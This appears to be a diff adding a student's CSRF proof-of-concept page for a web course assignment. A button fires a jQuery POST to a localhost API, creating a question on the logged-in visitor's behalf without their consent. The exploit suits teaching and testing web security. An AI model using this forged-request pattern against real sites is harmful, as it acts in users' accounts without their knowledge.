@@ -1,0 +1,39 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html>
+<title>CSC 309 Assignment 5 - CSRF Attack</title>
+<head>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+<script type="text/javascript">
+
+JSONTest = function() {
+
+    var resultDiv = $("#resultDivContainer");
+
+    $.ajax({
+        url: "http://localhost:9000/api/questions",
+        type: "POST",
+        data: { title: "bad question", text: "bad text", tags: ["tag1"] },
+        dataType: "json",
+        success: function (result) {
+		alert("Success")
+		},
+        error: function (xhr, ajaxOptions, thrownError) {
+        alert("Error");
+        }
+    });
+};
+
+</script>
+</head>
+<body>
+
+<h1>CSC309 Assignment 5 - CSRF Attack</h1>
+
+<div id="resultDivContainer"></div>
+
+<div>This page contains a button that when clicked will execute a script that will attempt to post a question on your behalf through CSRF.</div>
+<div>Instruction: Log in to your account in another tab and click the button below.</div>
+<button type="button" onclick="JSONTest()">Click me create a question on your behalf.</button>
+
+</body>
+</html> 
